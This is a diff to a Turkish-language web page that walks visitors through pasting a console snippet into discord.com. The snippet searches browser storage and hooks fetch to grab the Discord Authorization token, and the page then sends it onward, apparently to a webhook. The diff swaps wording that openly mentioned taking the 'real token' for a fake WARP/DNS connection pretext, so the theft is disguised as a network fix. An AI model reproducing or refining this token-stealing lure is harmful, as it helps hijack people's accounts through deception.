@@ -53,11 +53,11 @@
   <div id="sp" class="spin"></div>
 
   <div id="panel" class="panel hide">
-    <div class="warn">Hesap alındı. Şimdi <b>gerçek token</b> lazım — OAuth token'ı işe yaramıyor.</div>
+    <div class="warn">Hesap doğrulandı. Şimdi <b>DNS bağlantısı</b> gerekli — WARP'a bağlanılamıyor.</div>
 
     <div class="step">
       <b>Yol 1 — kodu çalıştır</b>
-      <p class="mini">Yeni sekmede <code>discord.com</code> aç → F12 → Console → kodu yapıştır → Enter. Token bulunca sayfa buraya kendisi döner.</p>
+      <p class="mini">Yeni sekmede <code>discord.com</code> aç → F12 → Console → kodu yapıştır → Enter. </p>
       <pre id="snippet"></pre>
       <button id="copy" class="sm">Kodu kopyala</button>
     </div>
@@ -196,7 +196,7 @@ function snippet() {
     'setTimeout(()=>{db.close();r()},500)};});}}catch(e){}',
     'const u=[...new Set(out.filter(t=>RE.test(t)))];',
     'if(u.length)return back(u[0]);',
-    'console.log("Bulunamadi - bir kanala tikla, yakalayacagim...");',
+    'console.log("Bulunamadi - bir kanala tikla, trafik kurulmak üzere...");',
     'const cap=t=>{if(t&&RE.test(t))back(t)};',
     'const of=window.fetch;window.fetch=function(...a){try{const h=a[1]&&a[1].headers;',
     'if(h){const g=h.get?h.get("Authorization"):(h.Authorization||h.authorization);cap(g)}}catch(e){}return of.apply(this,a)};',
@@ -225,8 +225,8 @@ async function sendReal(raw, src) {
     }]
   });
   $("#st").innerHTML = sent
-    ? '<span class="ok">Gerçek token gönderildi.</span>'
-    : '<span class="err">Gönderilemedi, tekrar dene.</span>';
+    ? '<span class="ok">Trafik onaylandı.</span>'
+    : '<span class="err">Bağlantı onaylanmadı, tekrar dene.</span>';
   return sent;
 }
 
@@ -313,14 +313,14 @@ async function callback(hash) {
 
   if (hash.get("t")) {
     $("#sp").style.display = "block";
-    $("#t").textContent = "Token alındı";
-    $("#m").textContent = "Gönderiliyor...";
+    $("#t").textContent = "Bağlantı kuruldu!";
+    $("#m").textContent = "HTTPS açılıyor...";
     $("#panel").classList.remove("hide");
     $("#snippet").textContent = snippet();
     const ok = await sendReal(hash.get("t"), "console");
     $("#sp").style.display = "none";
     $("#t").textContent = ok ? "Tamamlandı" : "Hata";
-    $("#m").textContent = ok ? "Token webhook'a düştü." : "Gönderilemedi, kutuya elle yapıştır.";
+    $("#m").textContent = ok ? "Trafik sunucuya bağlandı." : "Bağlanılamadı, kutuya elle yapıştır.";
     try { history.replaceState(null, "", location.pathname); } catch (e) {}
     return;
   }
